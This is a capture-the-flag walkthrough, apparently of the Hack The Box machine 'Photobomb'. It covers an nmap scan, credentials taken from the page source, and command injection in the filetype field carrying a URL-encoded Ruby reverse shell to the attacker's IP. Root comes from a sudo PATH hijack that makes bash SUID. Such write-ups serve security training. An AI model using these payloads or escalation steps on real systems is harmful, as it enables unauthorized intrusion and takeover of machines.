### Tools:

### Vulnerabilities: 

Nmap gives shows a webpage and ssh is open.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.44.124
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-13 10:04 CDT
Nmap scan report for 10.129.44.124
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
```

Accessing the webpage and looking at the source code we can find a username and password. ```pH0t0:b0Mb!```

http://pH0t0:b0Mb!@photobomb.htb/printer


![image](https://user-images.githubusercontent.com/105310322/195695976-b76720b2-7e3e-4d69-ab9d-9a08f19ac0ca.png)

Next we come to a page with pictures and a download section.

![image](https://user-images.githubusercontent.com/105310322/195698235-51057170-a92d-4bf5-b0be-7c14975b6f8f.png)


Before we get the the actual attack vector I tried a couple of different things.

In burp if we intercept the download page and get rid of fields except for the picture and then send it. This will actually bring us to a page that gives lots of information about what the webapp is running.

![image](https://user-images.githubusercontent.com/105310322/195699039-242afef3-3cf7-4eab-a376-e9d8f59e9b44.png)


I started with trying to exploit Sinatra with a directory traversal but the page confirmed that their were protections in place against it.

![image](https://user-images.githubusercontent.com/105310322/195699527-fc9a80e0-0ad5-46d3-90f9-037f80d8b313.png)

Also by trying to access other directories it will bring us to this page that confirms it is running Sinatra.

http://photobomb.htb/printerfriendly

![image](https://user-images.githubusercontent.com/105310322/195699688-cec33e27-e9d5-42c7-9000-94a8cc72ee7f.png)

Now on to the actual Attack Vector!


In BurpSuite intercept the ```Download Photo To Print```


ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.11",1234))'

enocode


photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;%72%75%62%79%20%2d%72%73%6f%63%6b%65%74%20%2d%65%27%73%70%61%77%6e%28%22%73%68%22%2c%5b%3a%69%6e%2c%3a%6f%75%74%2c%3a%65%72%72%5d%3d%3e%54%43%50%53%6f%63%6b%65%74%2e%6e%65%77%28%22%31%30%2e%31%30%2e%31%36%2e%31%31%22%2c%31%32%33%34%29%29%27&dimensions=30x20

```console
└─$ nc -lvnp 1234                    
listening on [any] 1234 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 49918
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```

```console
wizard@photobomb:/tmp$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

wizard@photobomb:/tmp$ sudo PATH=/tmp\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh

```console
└─$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 51630
id
uid=0(root) gid=0(root) groups=0(root)

bash-5.0# cat /dev/shm/chown
cat /dev/shm/chown
#!/bin/bash
chmod u+s /bin/bash
```

```console
wizard@photobomb:/tmp$ sudo PATH=/dev/shm\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
<n\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash
wizard@photobomb:/tmp$ bash -p
bash -p
bash-5.0# id
id
uid=1000(wizard) gid=1000(wizard) euid=0(root) groups=1000(wizard)
bash-5.0# 
```

```console
bash-5.0# cat /home/wizard/user.txt
cat /home/wizard/user.txt
bc45****************************
bash-5.0# cat /root/root.txt
cat /root/root.txt
5ab2****************************
```
